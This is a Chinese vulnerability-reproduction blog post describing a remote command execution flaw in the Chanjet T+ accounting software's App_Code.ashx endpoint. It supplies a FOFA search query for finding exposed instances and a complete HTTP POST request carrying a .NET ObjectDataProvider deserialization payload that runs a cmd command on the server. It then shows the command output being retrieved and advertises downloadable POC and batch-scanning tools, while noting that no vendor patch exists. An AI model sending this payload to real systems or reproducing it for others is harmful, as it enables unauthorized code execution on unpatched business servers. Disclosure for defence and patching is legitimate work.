#  畅捷通TPlus App_Code.ashx存在远程命令执行漏洞   
南风漏洞复现文库  南风漏洞复现文库   2024-04-08 23:40  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 畅捷通TPlus App_Code.ashx简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
畅捷通T+专属云适用于需要一体化管理的企业，财务管理、业务管理、零售管理、生产管理、物流管理、移动仓管、营销管理、委外加工等人财货客一体化管理。  
## 2.漏洞描述  
  
畅捷通T+专属云适用于需要一体化管理的企业，财务管理、业务管理、零售管理、生产管理、物流管理、移动仓管、营销管理、委外加工等人财货客一体化管理。畅捷通TPlus App_Code.ashx存在远程命令执行漏洞。  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
畅捷通T+  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bdWHhMKHia31IhIVFicGpqLYibhqYAakVT1aZEYiaDOgE5ZoRDvH5zaxW8OicCqYka1iblqg3LgbnOAajA/640?wx_fmt=jpeg&from=appmsg "null")  
  
畅捷通TPlus App_Code.ashx存在远程命令执行漏洞  
## 4.fofa查询语句  
  
app="畅捷通-TPlus"  
## 5.漏洞复现  
  
漏洞链接：https://127.0.0.1/tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore  
  
漏洞数据包：  
```
POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
Host: 127.0.0.1
X-Ajaxpro-Method: GetStoreWarehouseByStore
Content-Type: application/x-www-form-urlencoded
Content-Length: 570

{
  "storeID":{
    "__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
    "MethodName":"Start",
    "ObjectInstance":{
      "__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
      "StartInfo":{
        "__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
        "FileName":"cmd",
        "Arguments":"/c whoami > test1.txt"
      }
    }
  }
}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bdWHhMKHia31IhIVFicGpqLYN4MNS4aWiaIzaDPb73XRfCkSibiaviapbkhQmSmuF34IYhU90MtOlPHibLA/640?wx_fmt=jpeg&from=appmsg "null")  
  
上传文件链接：http://127.0.0.1/tplus/test1.txt  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bdWHhMKHia31IhIVFicGpqLYckxcDiaKUcQUUVY87aJuYxhZrTVWgicGqkFZOe3Okop1j3mD07RYrDRg/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
关注公众号 南风漏洞复现文库 并回复 漏洞复现121 即可获得该POC工具下载地址：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bdWHhMKHia31IhIVFicGpqLYNYNlZ043gDj3j0afvAwicCliaX5ibIX5giaYickPIyWY1pMuTBdZk3HvAWQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。2: 免登录，免费fofa查询。3: 更新其他实用网络安全工具项目。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bdWHhMKHia31IhIVFicGpqLYbvyBnAwdQpkticaEnE2ngERx25HiaUw9l8xoCURZ0XuficZ9H0mLZWOBw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bdWHhMKHia31IhIVFicGpqLYtKYZ4Foo0Th0nCIXWlF2XZMz5cQWQGb69lauxunS1Itgn3ZS7Lyp3A/640?wx_fmt=jpeg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bdWHhMKHia31IhIVFicGpqLYlQFaFOTOw82kD4aBJicXKdKh4B9m53ey6ibU6IDF1PUkOcWIMgj6ND7Q/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bdWHhMKHia31IhIVFicGpqLYGBW6dbnxxDfLg0tehSTsSXicm8iaSKasXbD8bwGFzeggWoKXwib9UYPYg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bdWHhMKHia31IhIVFicGpqLYt9cWynBwgn9VEvz85G55z8pibgUTwP5B13uq9R6Kn7icaJ5FGGvnr8BA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bdWHhMKHia31IhIVFicGpqLY7XvP8sFRxVl0iafzYjSw58ROmYpNzkkvNoecicYGVliaAbwypbjjNkm5g/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
目前厂商尚未提供相关漏洞补丁链接，请关注厂商主页及时更新： https://www.chanjet.com/  
## 8.往期回顾  
  
[畅捷通TPlus KeyInfoList.aspx存在SQL注入漏洞](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247486062&idx=2&sn=734033609e43c27806a2754a4c12a4ef&chksm=974b8769a03c0e7fe12e9dbedd78f5e19804367e6a38f1e6dea528444b70aad476ef119f7f3e&scene=21#wechat_redirect)  
  
  
[用友U9 PatchFile.asmx接口存在任意文件上传漏洞](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247486033&idx=1&sn=9871ceeb9777fa646c0de20494af9e69&chksm=974b8756a03c0e401f267c15fd34df9f3ca2bd3a10b87efc707df3b4677f60157207c8c72178&scene=21#wechat_redirect)  
  
  
  
  
